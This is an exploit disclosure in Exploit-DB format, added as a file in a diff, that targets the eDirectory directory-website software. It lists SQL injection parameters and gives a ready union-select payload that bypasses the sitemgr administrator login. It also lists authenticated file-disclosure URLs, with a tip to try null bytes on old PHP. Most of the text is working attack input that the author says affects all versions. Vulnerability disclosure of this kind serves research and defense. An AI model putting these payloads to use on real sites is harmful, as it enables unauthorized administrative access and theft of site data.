@@ -1,0 +1,29 @@
+# Exploit Title: Admin auth bypass, SQLi and File Disclosure
+# Google Dork: no defacers please !
+# Date: March 2019 (reported to vendor without response :D)
+# Exploit Author: Efren Diaz
+# Author contact: https://twitter.com/elefr3n
+# Vendor Homepage: https://www.edirectory.com/
+# Software Link: not available
+# Version: All versions
+# Tested on: Ubuntu 14.04
+# CVE : none
+
+#DESCRIPTION
+eDirectory is a software to create your own membership website, business directories, yellow pages, coupon sites, local guide, lead gen sites and more.
+
+
+# SQL Injection
+Links:
+  - https://site.com/location.php?type=byId&id=[INT]&childLevel=[INT]&level=[SQLi]
+  - https://site.com/sitemgr/login.php?key=[SQLi]
+
+# Administrator Login Bypass
+The login SQL injection can be useful for us to make a union SQL injection to avoid the administrator authentication and get access to the dashboard correctly. Sometimes you get a "Invalid key error", but the web application set to you correctly the cookie, if you got that error press F5 and you will be authenticated as an administrator
+Link: https://site.com/sitemgr/login.php?key=' union select 0,1,0,'sitemgr' -- -
+
+# File Disclosure (authenticated)
+Note: only files with .php extension, but don't forget try null-byte in old php versions
+Links:
+  - https://site.com/sitemgr/langcenter/language_file.php?language_area=front&domain_id=1&language_id=[PATH]
+  - https://site.com/sitemgr/configuration/geography/language/language_file.php?language_area=front&domain_id=1&language_id=[PATH]
